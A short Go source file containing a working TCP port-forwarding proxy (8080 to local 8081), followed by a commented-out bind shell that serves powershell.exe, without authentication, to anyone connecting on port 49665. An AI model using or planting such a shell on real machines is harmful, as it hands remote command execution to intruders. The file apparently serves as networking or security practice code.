package main

import (
	"io"
	"log"
	"net"
)

func main() {
	listener, err := net.Listen("tcp", ":8080")
	if err != nil {
		log.Fatalf("Failed to listen on port 8080: %v", err)
	}
	defer listener.Close()
	log.Println("Listening on port 8080")

	for {
		localConn, err := listener.Accept()
		if err != nil {
			log.Printf("Failed to accept connection: %v", err)
			continue
		}
		// Handle each connection in a separate goroutine.
		go handleConnection(localConn)
	}
}

func handleConnection(localConn net.Conn) {
	defer localConn.Close()
	remoteConn, err := net.Dial("tcp", "127.0.0.1:8081")
	if err != nil {
		log.Printf("Failed to connect to remote server: %v", err)
		return
	}
	defer remoteConn.Close()

	// Use a channel to monitor when to close the connection.
	done := make(chan struct{})

	go func() {
		_, err := io.Copy(remoteConn, localConn)
		if err != nil {
			log.Printf("Error copying from local to remote: %v", err)
		}
		done <- struct{}{}
	}()

	go func() {
		_, err := io.Copy(localConn, remoteConn)
		if err != nil {
			log.Printf("Error copying from remote to local: %v", err)
		}
		done <- struct{}{}
	}()

	// Wait for either go routine to finish, then close connections.
	<-done
}

// package main

// import (
// 	"io"
// 	"log"
// 	"net"
// 	"os/exec"
// )

// func handle(conn net.Conn) {
// 	// Use cmd.exe for Windows
// 	cmd := exec.Command("powershell.exe")
// 	rp, wp := io.Pipe()

// 	// Set stdin to our connection
// 	cmd.Stdin = conn
// 	cmd.Stdout = wp

// 	// Copy output back to the connection
// 	go io.Copy(conn, rp)

// 	// Run the command
// 	err := cmd.Run()
// 	if err != nil {
// 		log.Println("Error running command:", err)
// 	}

// 	// Close the connection
// 	conn.Close()
// }

// func main() {
// 	listener, err := net.Listen("tcp", ":49665")
// 	if err != nil {
// 		log.Fatalln(err)
// 	}

// 	log.Println("Listening on port 49665...")

// 	for {
// 		conn, err := listener.Accept()
// 		if err != nil {
// 			log.Println("Error accepting connection:", err)
// 			continue
// 		}
// 		go handle(conn)
// 	}
// }
